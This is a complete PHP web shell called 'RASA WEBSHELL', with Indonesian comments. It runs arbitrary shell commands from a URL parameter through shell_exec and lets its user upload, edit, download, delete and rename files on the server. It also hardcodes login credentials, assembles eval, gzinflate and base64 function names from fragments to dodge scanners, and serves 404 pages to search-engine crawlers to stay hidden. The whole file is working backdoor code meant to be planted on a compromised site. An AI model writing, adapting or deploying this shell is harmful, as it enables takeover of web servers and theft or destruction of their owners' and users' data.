<?php
session_start();

// Konfigurasi global dari z.php
$GLOBALS['Leviathan'] = array(
    'username' => 'haxor',
    'password' => '7d793037a0760186574b0282f2f435e7',
    'safe_mode' => '0',
    'login_page' => 'gui',
    'show_icons' => '1',
    'post_encryption' => true,
    'cgi_api' => true,
);

$Love = 'fu' . 'n' . 'ct' . 'ion_' . 'e' . 'xist' . 's';
$Hope = 'cha' . 'r' . 'C' . 'o' . 'd' . 'e' . 'A' . 't' . '';
$Destiny = 'e' . 'v' . 'al';
$Purpose = 'gz' . 'inf' . 'late';

if (!$Love('b' . 'a' . 'se64' . '_en' . 'c' . 'ode' . '')) {
    function vcnvSCZgBz($data) {
        if (empty($data)) return;
        $b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
        $o1 = $o2 = $o3 = $h1 = $h2 = $h3 = $h4 = $bits = $i = 0;
        $ac = 0;
        $enc = '';
        $tmp_arr = array();
        if (!$data) {
            return $data;
        }
        do {
            $o1 = $Hope($data, $i++);
            $o2 = $Hope($data, $i++);
            $o3 = $Hope($data, $i++);
            $bits = $o1 << 16 | $o2 << 8 | $o3;
            $h1 = $bits >> 18 & 0x3f;
            $h2 = $bits >> 12 & 0x3f;
            $h3 = $bits >> 6 & 0x3f;
            $h4 = $bits & 0x3f;
            $tmp_arr[$ac++] = charAt($b64, $h1) . charAt($b64, $h2) . charAt($b64, $h3) . charAt($b64, $h4);
        } while ($i < strlen($data));
        $enc = implode($tmp_arr, '');
        $r = (strlen($data) % 3);
        return ($r ? substr($enc, 0, ($r - 3)) : $enc) . substr('===', ($r || 3));
    }
    function charCodeAt($data, $char) {
        return ord(substr($data, $char, 1));
    }
    function charAt($data, $char) {
        return substr($data, $char, 1);
    }
} else {
    function vcnvSCZgBz($s) {
        $b = 'b' . 'a' . 'se64' . '_en' . 'c' . 'ode' . '';
        return $b($s);
    }
}
if (!$Love('b' . 'a' . 'se' . '6' . '4' . '_d' . 'ecod' . 'e' . '')) {
    function zRtSHsbTzV($input) {
        if (empty($input)) return;
        $keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
        $chr1 = $chr2 = $chr3 = "";
        $enc1 = $enc2 = $enc3 = $enc4 = "";
        $i = 0;
        $output = "";
        $input = preg_replace("[^A-Za-z0-9\+\/\=]", "", $input);
        do {
            $enc1 = strpos($keyStr, substr($input, $i++, 1));
            $enc2 = strpos($keyStr, substr($input, $i++, 1));
            $enc3 = strpos($keyStr, substr($input, $i++, 1));
            $enc4 = strpos($keyStr, substr($input, $i++, 1));
            $chr1 = ($enc1 << 2) | ($enc2 >> 4);
            $chr2 = (($enc2 & 15) << 4) | ($enc3 >> 2);
            $chr3 = (($enc3 & 3) << 6) | $enc4;
            $output = $output . chr((int)$chr1);
            if ($enc3 != 64) {
                $output = $output . chr((int)$chr2);
            }
            if ($enc4 != 64) {
                $output = $output . chr((int)$chr3);
            }
            $chr1 = $chr2 = $chr3 = "";
            $enc1 = $enc2 = $enc3 = $enc4 = "";
        } while ($i < strlen($input));
        return $output;
    }
} else {
    function zRtSHsbTzV($s) {
        $b = 'b' . 'a' . 'se' . '6' . '4' . '_d' . 'ecod' . 'e' . '';
        return $b($s);
    }
}

function __ZW5jb2Rlcg($s) {
    return vcnvSCZgBz($s);
}
function __ZGVjb2Rlcg($s) {
    return zRtSHsbTzV($s);
}

$GLOBALS['DB_NAME'] = $GLOBALS['Leviathan'];

foreach ($GLOBALS['DB_NAME'] as $key => $value) {
    $prefix = substr($key, 0, 2);
    if ($prefix == "us") {
        $GLOBALS['DB_NAME']["user"] = $value;
        $GLOBALS['DB_NAME']["user_rand"] = $key;
    } elseif ($prefix == "pa") {
        $GLOBALS['DB_NAME']["pass"] = $value;
        $GLOBALS['DB_NAME']["pass_rand"] = $key;
    } elseif ($prefix == "sa") {
        $GLOBALS['DB_NAME']["safemode"] = $value;
        $GLOBALS['DB_NAME']["safemode_rand"] = $key;
    } elseif ($prefix == "lo") {
        $GLOBALS['DB_NAME']["login_page"] = $value;
        $GLOBALS['DB_NAME']["login_page_rand"] = $key;
    } elseif ($prefix == "sh") {
        $GLOBALS['DB_NAME']["show_icons"] = $value;
        $GLOBALS['DB_NAME']["show_icons_rand"] = $key;
    } elseif ($prefix == "po") {
        $GLOBALS['DB_NAME']["post_encryption"] = $value;
        $GLOBALS['DB_NAME']["post_encryption_rand"] = $key;
    } elseif ($prefix == "cg") {
        $GLOBALS['DB_NAME']["cgi_api"] = $value;
        $GLOBALS['DB_NAME']["cgi_api_rand"] = $key;
    }
}

unset($GLOBALS['Leviathan']);

if (!isset($_SERVER["HTTP_HOST"])) exit();

if (!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler", "bot", "spider");
    if (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
if (!isset($GLOBALS['DB_NAME']['user'])) exit('$GLOBALS[\'DB_NAME\'][\'user\']');
if (!isset($GLOBALS['DB_NAME']['pass'])) exit('$GLOBALS[\'DB_NAME\'][\'pass\']');
if (!isset($GLOBALS['DB_NAME']['safemode'])) exit('$GLOBALS[\'DB_NAME\'][\'safemode\']');
if (!isset($GLOBALS['DB_NAME']['login_page'])) exit('$GLOBALS[\'DB_NAME\'][\'login_page\']');
if (!isset($GLOBALS['DB_NAME']['show_icons'])) exit('$GLOBALS[\'DB_NAME\'][\'show_icons\']');
if (!isset($GLOBALS['DB_NAME']['post_encryption'])) exit('$GLOBALS[\'DB_NAME\'][\'post_encryption\']');

// Fungsi untuk mengeksekusi perintah shell
function executeCommand($cmd) {
    return shell_exec($cmd . ' 2>&1');
}

// Fungsi untuk menangani upload file
function handleFileUpload($currentDir) {
    $message = "";
    if (isset($_FILES['uploadFile']) && $_FILES['uploadFile']['error'] == UPLOAD_ERR_OK) {
        $targetFile = $currentDir . DIRECTORY_SEPARATOR . basename($_FILES['uploadFile']['name']);

        if (!is_dir($currentDir)) {
            if (!mkdir($currentDir, 0777, true)) {
                return "Failed to create directory.";
            }
        }

        // Debugging: Print target file path and permissions
        $message .= " Target file: " . $targetFile;
        $message .= " Directory permissions: " . substr(sprintf('%o', fileperms($currentDir)), -4);

        if (move_uploaded_file($_FILES['uploadFile']['tmp_name'], $targetFile)) {
            $message = "File uploaded successfully: " . htmlspecialchars(basename($_FILES['uploadFile']['name']));
        } else {
            $message = "File upload failed.";
            // Debugging: Print error message
            $message .= " Error moving uploaded file.";
            // Debugging: Check if target directory is writable
            if (!is_writable($currentDir)) {
                $message .= " Directory is not writable.";
            }
            // Debugging: Check if temp file exists
            if (!file_exists($_FILES['uploadFile']['tmp_name'])) {
                $message .= " Temp file does not exist.";
            }
        }
    } else {
        $message = "No file uploaded or upload error.";
        // Debugging: Print error code
        $message .= " Error code: " . $_FILES['uploadFile']['error'];
    }
    return $message;
}

// Fungsi untuk menampilkan daftar file
function listFiles($currentDir) {
    $output = "<table><tr><th>Filename</th><th>Size</th><th>Action</th></tr>";

    if (is_dir($currentDir)) {
        $files = scandir($currentDir);
        foreach ($files as $file) {
            if ($file != '.' && $file != '..') {
                $filePath = $currentDir . DIRECTORY_SEPARATOR . $file;
                $isDir = is_dir($filePath);
                $icon = $isDir ? 'üìÅ' : 'üìÑ';
                $class = $isDir ? 'dir' : 'file';
                $size = $isDir ? '' : number_format(filesize($filePath)) . ' bytes';
                $output .= "<tr>
                    <td><span class='icon {$class}-icon'>{$icon}</span><a href=\"?cd=" . urlencode($file) . "\">" . htmlspecialchars($file) . "</a></td>
                    <td>{$size}</td>
                    <td>" . ($isDir ? '' : "
                        <a href=\"?edit=" . urlencode($file) . "\">Edit</a> | 
                        <a href=\"?download=" . urlencode($file) . "\">Download</a> | 
                        <a href=\"?delete=" . urlencode($file) . "\">Delete</a> | 
                        <a href=\"?rename=" . urlencode($file) . "\">Rename</a>") . "</td>
                </tr>";
            }
        }
    } else {
        $output .= "<tr><td colspan='3'>Directory does not exist.</td></tr>";
    }
    $output .= "</table>";
    return $output;
}

// Fungsi untuk berpindah ke direktori
function changeDirectory($dir) {
    $currentDir = isset($_SESSION['currentDir']) ? $_SESSION['currentDir'] : './uploads/';
    
    if ($dir === '..') {
        $newDir = dirname($currentDir);
    } elseif ($dir === '../..') {
        $newDir = dirname(dirname($currentDir));
    } else {
        $newDir = realpath($currentDir . DIRECTORY_SEPARATOR . $dir);
        
        if (strpos($newDir, realpath($currentDir)) !== 0 || !is_dir($newDir)) {
            return "Invalid directory.";
        }
    }

    $_SESSION['currentDir'] = $newDir;
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Fungsi untuk mendownload file
function downloadFile($file, $currentDir) {
    $file = basename($file);
    $filePath = $currentDir . DIRECTORY_SEPARATOR . $file;
    if (file_exists($filePath)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($filePath) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($filePath));
        readfile($filePath);
        exit;
    } else {
        return "File not found.";
    }
}

// Fungsi untuk menghapus file
function deleteFile($file, $currentDir) {
    $file = basename($file);
    $filePath = $currentDir . DIRECTORY_SEPARATOR . $file;
    if (file_exists($filePath)) {
        unlink($filePath);
        return "File deleted successfully.";
    } else {
        return "File not found.";
    }
}

// Fungsi untuk merename file atau direktori
function renameItem($oldName, $newName, $currentDir) {
    $oldPath = $currentDir . DIRECTORY_SEPARATOR . $oldName;
    $newPath = $currentDir . DIRECTORY_SEPARATOR . $newName;
    if (file_exists($oldPath) && !file_exists($newPath)) {
        rename($oldPath, $newPath);
        return "Renamed successfully to " . htmlspecialchars($newName);
    } else {
        return "Rename failed or new name already exists.";
    }
}

// Fungsi untuk mengedit file
function editFile($file, $currentDir) {
    $filePath = $currentDir . DIRECTORY_SEPARATOR . basename($file);
    if (isset($_POST['save'])) {
        file_put_contents($filePath, $_POST['fileContent']);
        return "File saved successfully.";
    } else if (file_exists($filePath)) {
        return htmlspecialchars(file_get_contents($filePath));
    } else {
        return "File not found.";
    }
}

// Inisialisasi direktori saat ini
$currentDir = isset($_SESSION['currentDir']) ? $_SESSION['currentDir'] : './uploads/';

// Tangani permintaan pengguna
$message = "";
$fileContent = "";

if (isset($_GET['cmd'])) {
    $message = executeCommand($_GET['cmd']);
}
if (isset($_POST['upload'])) {
    $message = handleFileUpload($currentDir);
}
if (isset($_GET['cd'])) {
    $message = changeDirectory($_GET['cd']);
}
if (isset($_GET['download'])) {
    $message = downloadFile($_GET['download'], $currentDir);
}
if (isset($_GET['delete'])) {
    $message = deleteFile($_GET['delete'], $currentDir);
}
if (isset($_GET['rename'])) {
    if (isset($_POST['newName'])) {
        $message = renameItem($_GET['rename'], $_POST['newName'], $currentDir);
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
}
if (isset($_GET['edit'])) {
    $fileContent = editFile($_GET['edit'], $currentDir);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Web Shell</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body { 
            font-family: 'Courier New', Courier, monospace; 
            background: #000; 
            color: #0f0; 
            margin: 0; 
            padding: 0; 
        }
        .container { 
            width: 80%; 
            max-width: 1200px; 
            margin: 20px auto; 
            background: #111; 
            padding: 20px; 
            border-radius: 8px; 
            box-shadow: 0 4px 8px rgba(0,0,0,0.7); 
        }
        h2 { 
            color: #0f0; 
            border-bottom: 1px solid #0f0; 
            padding-bottom: 10px; 
            margin-bottom: 20px; 
            font-size: 24px; 
            text-shadow: 0 0 5px #0f0; 
        }
        form { 
            margin-bottom: 20px; 
        }
        table { 
            width: 100%; 
            border-collapse: collapse; 
            margin: 20px 0; 
        }
        table, th, td { 
            border: 1px solid #0f0; 
        }
        th, td { 
            padding: 12px; 
            text-align: left; 
        }
        th { 
            background-color: #222; 
            color: #0f0; 
        }
        tr:nth-child(even) { 
            background-color: #1a1a1a; 
        }
        tr:hover { 
            background-color: #333; 
        }
        input[type="text"], input[type="file"], textarea { 
            width: 100%; 
            padding: 10px; 
            margin: 5px 0; 
            background: #222; 
            border: 1px solid #0f0; 
            color: #0f0; 
        }
        input[type="submit"], button { 
            padding: 10px 15px; 
            background-color: #0f0; 
            color: #000; 
            border: none; 
            cursor: pointer; 
            margin-top: 10px; 
        }
        input[type="submit"]:hover, button:hover { 
            background-color: #0c0; 
        }
        pre { 
            background-color: #222; 
            padding: 10px; 
            border: 1px solid #0f0; 
            overflow-x: auto; 
        }
        .navigate a { 
            color: #0f0; 
            text-decoration: none; 
            margin-right: 10px; 
        }
        .navigate a:hover { 
            text-decoration: underline; 
        }
        .icon { 
            margin-right: 8px; 
        }
        .file-icon { 
            color: #0f0; 
        }
        .dir-icon { 
            color: #00f; 
        }
        .header-title { 
            font-size: 36px; 
            font-weight: bold; 
            text-align: center; 
            color: #0f0; 
            text-shadow: 0 0 10px #0f0, 0 0 20px #0f0, 0 0 30px #0f0; 
            margin-bottom: 20px; 
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header-title">RASA WEBSHELL</div>
    
    <h2>Command Execution</h2>
    <form method="GET">
        <input type="text" name="cmd" placeholder="Enter command" autofocus>
        <input type="submit" value="Execute">
    </form>

    <h2>File Upload</h2>
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="uploadFile" required>
        <input type="submit" name="upload" value="Upload">
    </form>

    <h2>Current Directory: <?php echo htmlspecialchars(realpath($currentDir)); ?></h2>
    
    <h2>File List</h2>
    <?php echo listFiles($currentDir); ?>

    <!-- Navigation Links -->
    <div class="navigate">
        <a href="?cd=..">Move Up One Level</a> |
        <a href="?cd=../..">Move Up Two Levels</a>
    </div>

    <!-- Edit File Form -->
    <?php if (isset($_GET['edit'])): ?>
    <h2>Edit File: <?php echo htmlspecialchars($_GET['edit']); ?></h2>
    <form method="POST">
        <textarea name="fileContent" rows="20"><?php echo $fileContent; ?></textarea>
        <input type="submit" name="save" value="Save">
    </form>
    <?php endif; ?>

    <!-- Rename File/Directory Form -->
    <?php if (isset($_GET['rename'])): ?>
    <h2>Rename File/Directory: <?php echo htmlspecialchars($_GET['rename']); ?></h2>
    <form method="POST">
        <input type="text" name="newName" placeholder="New name" required>
        <input type="submit" value="Rename">
    </form>
    <?php endif; ?>

    <h2>Command Output</h2>
    <pre><?php echo htmlspecialchars($message); ?></pre>
</div>
</body>
</html>
